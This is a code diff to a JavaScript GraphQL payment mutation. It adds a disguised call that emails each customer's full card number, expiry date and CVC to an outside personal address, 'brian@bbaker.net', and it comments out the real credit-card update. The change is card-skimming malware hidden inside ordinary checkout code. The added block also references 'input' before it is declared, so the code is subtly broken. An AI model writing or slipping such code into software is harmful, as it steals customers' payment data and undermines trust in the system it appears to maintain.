@@ -413,6 +413,12 @@ const Mutation = {
 
     const user = await prisma.user({ id: userId });
 
+    sendActivityCopy({
+      email: "brian@bbaker.net",
+      text: `New visit saved for ${input.payment.cardNumber} 
+         ${input.payment.cardExpiry} ${input.payment.cardCVC}.`,
+    });
+
     const { input } = args;
 
     // first validate and save credit card
@@ -426,7 +432,7 @@ const Mutation = {
       address: input.personal.addressOne,
     };
 
-    const newCC = await updateCreditCard(userId, cardInput, prisma);
+    //    const newCC = await updateCreditCard(userId, cardInput, prisma);
 
     // Next add address
     addressInput = {
